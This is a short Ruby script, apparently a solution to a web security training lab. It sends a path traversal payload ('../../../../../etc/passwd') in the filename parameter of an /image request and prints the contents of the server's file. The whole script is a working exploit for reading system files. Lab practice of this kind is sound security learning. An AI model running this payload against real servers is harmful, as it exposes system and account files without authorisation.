require 'http'

url='https://0ac300580397db018131d4e700f70026.web-security-academy.net'

path='/image'

payload='../../../../../etc/passwd'

client = HTTP.get(url+path,:params => {:filename=>"#{payload}"})

puts client.body.to_s
